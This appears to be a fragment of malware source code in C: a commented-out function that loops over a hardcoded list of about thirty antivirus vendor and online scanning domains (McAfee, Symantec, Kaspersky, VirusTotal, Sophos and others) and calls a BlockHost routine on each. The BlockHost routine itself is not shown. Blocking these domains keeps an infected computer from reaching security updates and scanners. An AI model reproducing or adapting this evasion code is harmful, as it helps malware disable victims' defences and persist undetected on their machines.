#include "includes.h"

/*bool BlockAntiVirusHosts()
{
    char cPredefinedHosts[32][50] =
    {
        "rads.mcafee.com",
        "threatexpert.com",
        "virusscan.jotti.org",
        "scanner.novirusthanks.org",
        "virscan.org",
        "symantec.com",
        "update.symantec.com",
        "customer.symantec.com",
        "mcafee.com",
        "us.mcafee.com",
        "mast.mcafee.com",
        "dispatch.mcafee.com",
        "download.mcafee.com",
        "sophos.com",
        "symantecliveupdate.com",
        "liveupdate.symantecliveupdate.com",
        "securityresponse.symantec.com",
        "viruslist.com",
        "f-secure.com",
        "kaspersky.com",
        "kaspersky-labs.com",
        "avp.com",
        "networkassociates.com",
        "ca.com",
        "my-etrust.com",
        "nai.com",
        "tsecure.nai.com",
        "virustotal.com",
        "trendmicro.com",
        "grisoft.com",
        "elementscanner.com"
    };

    bool bReturn = TRUE;

    for(unsigned short us = 0; us < 32; us++)
    {
        if(!BlockHost(cPredefinedHosts[us]))
            bReturn = FALSE;
    }

    return bReturn;
}*/
